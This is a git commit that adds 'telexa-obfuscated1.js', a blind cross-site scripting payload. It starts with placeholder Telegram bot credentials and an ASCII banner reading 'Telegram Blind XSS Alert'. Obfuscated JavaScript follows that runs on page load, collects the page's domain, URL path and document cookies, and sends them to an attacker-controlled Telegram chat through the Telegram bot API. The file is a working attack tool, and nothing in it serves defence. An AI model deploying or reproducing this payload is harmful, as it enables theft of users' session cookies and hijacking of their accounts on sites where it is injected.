9a8efe299d551de6a775313dd69f6ade4ece5524
ZeroByte.ID Warehouse <38853171+zerobyte-id@users.noreply.github.com>
2019-06-08 04:19:52 +0700

    Create telexa-obfuscated1.js

---
+++ telexa-obfuscated1.js
@@ -0,0 +1,14 @@
+var tokenBot = '31337317:L3e-7h4x00r_1tsr4md0mbruHhh000'; // Your "tokenBot" Here
+var chatId = '31337'; // Your "chatId" Here
+
+/*
+	    _____    _     __   __  ___  
+	   |_   _|  | |    \ \ / / / _ \ 
+	     | | ___| | ___ \ V / / /_\ \
+	     | |/ _ \ |/ _ \/   \ |  _  |
+	     | |  __/ |  __/ /`\ \| | | |
+	     \_/\___|_|\___\/   \/\_| |_/
+	 ---- Telegram Blind XSS Alert ----
+*/
+
+var _0x42d7=['send','<b>XSS+Alert+in+','location','pathname','cookie','</pre>','open','GET','https://api.telegram.org/bot','/sendMessage?chat_id=','&parse_mode=html'];(function(_0x52bf31,_0x41a457){var _0x10c10d=function(_0x742cee){while(--_0x742cee){_0x52bf31['push'](_0x52bf31['shift']());}};_0x10c10d(++_0x41a457);}(_0x42d7,0xa6));var _0x2ff5=function(_0x8cb07,_0x529122){_0x8cb07=_0x8cb07-0x0;var _0xc1d01b=_0x42d7[_0x8cb07];return _0xc1d01b;};function telegramSend(_0x40c722,_0xa09415){var _0x177d8d=_0x2ff5('0x0')+document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>'+document[_0x2ff5('0x1')]['hostname']+document[_0x2ff5('0x1')][_0x2ff5('0x2')]+'</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>'+document[_0x2ff5('0x3')]+_0x2ff5('0x4');var _0x291de1=new XMLHttpRequest();_0x291de1[_0x2ff5('0x5')](_0x2ff5('0x6'),_0x2ff5('0x7')+_0x40c722+_0x2ff5('0x8')+_0xa09415+'&text='+_0x177d8d+_0x2ff5('0x9'),!![]);_0x291de1[_0x2ff5('0xa')]();}telegramSend(tokenBot,chatId);
